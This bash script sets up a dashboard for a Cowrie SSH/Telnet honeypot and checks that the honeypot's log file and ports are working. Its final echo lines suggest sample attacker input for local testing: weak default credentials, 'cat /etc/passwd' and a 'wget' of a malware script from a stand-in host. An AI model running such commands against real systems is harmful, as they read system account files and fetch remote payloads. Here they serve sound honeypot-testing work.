#!/bin/bash

echo "🔗 Setting up Dashboard Integration with Cowrie..."

# Function to find Cowrie installation
find_cowrie() {
    possible_paths=(
        "/home/cowrie/cowrie"
        "/opt/cowrie"
        "/usr/local/cowrie"
        "/var/lib/cowrie"
    )
    
    for path in "${possible_paths[@]}"; do
        if [ -d "$path" ]; then
            echo "$path"
            return 0
        fi
    done
    
    return 1
}

# Function to find Cowrie log file
find_cowrie_log() {
    possible_logs=(
        "/home/cowrie/cowrie/var/log/cowrie/cowrie.json"
        "/opt/cowrie/var/log/cowrie/cowrie.json"
        "/var/log/cowrie/cowrie.json"
        "/home/cowrie/cowrie/var/log/cowrie.json"
    )
    
    for log in "${possible_logs[@]}"; do
        if [ -f "$log" ]; then
            echo "$log"
            return 0
        fi
    done
    
    return 1
}

# Find Cowrie installation
COWRIE_PATH=$(find_cowrie)
if [ -z "$COWRIE_PATH" ]; then
    echo "❌ Cowrie installation not found in standard locations"
    echo "🔍 Let's check what we have..."
    
    # Check if Cowrie service exists and is running
    if systemctl list-unit-files | grep -q cowrie; then
        echo "✅ Cowrie service exists"
        if systemctl is-active --quiet cowrie; then
            echo "✅ Cowrie service is running"
            
            # Try to find the working directory from systemd
            WORKING_DIR=$(systemctl show cowrie -p WorkingDirectory --value)
            if [ -n "$WORKING_DIR" ] && [ -d "$WORKING_DIR" ]; then
                echo "✅ Found Cowrie working directory: $WORKING_DIR"
                COWRIE_PATH="$WORKING_DIR"
            fi
        else
            echo "⚠️  Cowrie service exists but is not running"
            echo "🚀 Starting Cowrie service..."
            sudo systemctl start cowrie
            sleep 5
        fi
    else
        echo "❌ Cowrie service not found"
        echo "Please run ./install-cowrie.sh first"
        exit 1
    fi
fi

if [ -n "$COWRIE_PATH" ]; then
    echo "✅ Found Cowrie at: $COWRIE_PATH"
else
    echo "❌ Could not locate Cowrie installation"
    exit 1
fi

# Find log file
COWRIE_LOG=$(find_cowrie_log)
if [ -z "$COWRIE_LOG" ]; then
    echo "⚠️  Log file not found, creating it..."
    # Try to create in the most likely location
    COWRIE_LOG="$COWRIE_PATH/var/log/cowrie/cowrie.json"
    sudo -u cowrie mkdir -p "$(dirname "$COWRIE_LOG")"
    sudo -u cowrie touch "$COWRIE_LOG"
fi

echo "✅ Using log file: $COWRIE_LOG"

# Set up environment variable
echo "🔧 Configuring environment..."
echo "COWRIE_LOG_PATH=$COWRIE_LOG" > .env.local
echo "✅ Environment configured"

# Make log file readable by the dashboard
echo "🔧 Setting up log file permissions..."
sudo chmod 644 "$COWRIE_LOG" 2>/dev/null || true

# Check if Node.js dependencies are installed
if [ ! -d "node_modules" ]; then
    echo "📦 Installing Node.js dependencies..."
    npm install
fi

# Check Cowrie status
echo "🔍 Checking Cowrie status..."
if systemctl is-active --quiet cowrie; then
    echo "✅ Cowrie service is running"
else
    echo "⚠️  Cowrie service is not running, starting it..."
    sudo systemctl start cowrie
    sleep 5
fi

# Check ports
echo "🔍 Checking Cowrie ports..."
if netstat -ln 2>/dev/null | grep -q ":2222" || ss -ln 2>/dev/null | grep -q ":2222"; then
    echo "✅ SSH honeypot is listening on port 2222"
else
    echo "❌ SSH honeypot is not listening on port 2222"
fi

if netstat -ln 2>/dev/null | grep -q ":2223" || ss -ln 2>/dev/null | grep -q ":2223"; then
    echo "✅ Telnet honeypot is listening on port 2223"
else
    echo "❌ Telnet honeypot is not listening on port 2223"
fi

# Test log file access
echo "🧪 Testing log file access..."
if [ -r "$COWRIE_LOG" ]; then
    echo "✅ Log file is readable"
    if [ -s "$COWRIE_LOG" ]; then
        echo "📊 Current log file size: $(du -h "$COWRIE_LOG" | cut -f1)"
    else
        echo "📝 Log file is empty (this is normal for a new installation)"
    fi
else
    echo "❌ Cannot read log file"
    echo "🔧 Fixing permissions..."
    sudo chmod 644 "$COWRIE_LOG"
fi

echo ""
echo "✅ Dashboard integration setup complete!"
echo ""
echo "🚀 Starting the dashboard..."

# Kill any existing dev server
pkill -f "next dev" 2>/dev/null || true
sleep 2

# Start the dashboard
npm run dev &
DEV_PID=$!

sleep 5

echo ""
echo "🎯 Test the honeypot with these commands:"
echo ""
echo "SSH Tests:"
echo "  ssh root@localhost -p 2222"
echo "  ssh admin@localhost -p 2222"
echo "  ssh user@localhost -p 2222"
echo ""
echo "Telnet Tests:"
echo "  telnet localhost 2223"
echo ""
echo "🔑 Try these credentials:"
echo "  Usernames: root, admin, user, guest, test"
echo "  Passwords: admin, password, 123456, root, test, qwerty"
echo ""
echo "💻 Try these commands after connecting:"
echo "  ls -la"
echo "  cat /etc/passwd"
echo "  ps aux"
echo "  uname -a"
echo "  wget http://example.com/malware.sh"
echo ""
echo "📊 Dashboard: http://localhost:3000"
echo "📝 Live logs: sudo tail -f $COWRIE_LOG"
echo ""
echo "🛑 To stop the dashboard: kill $DEV_PID"
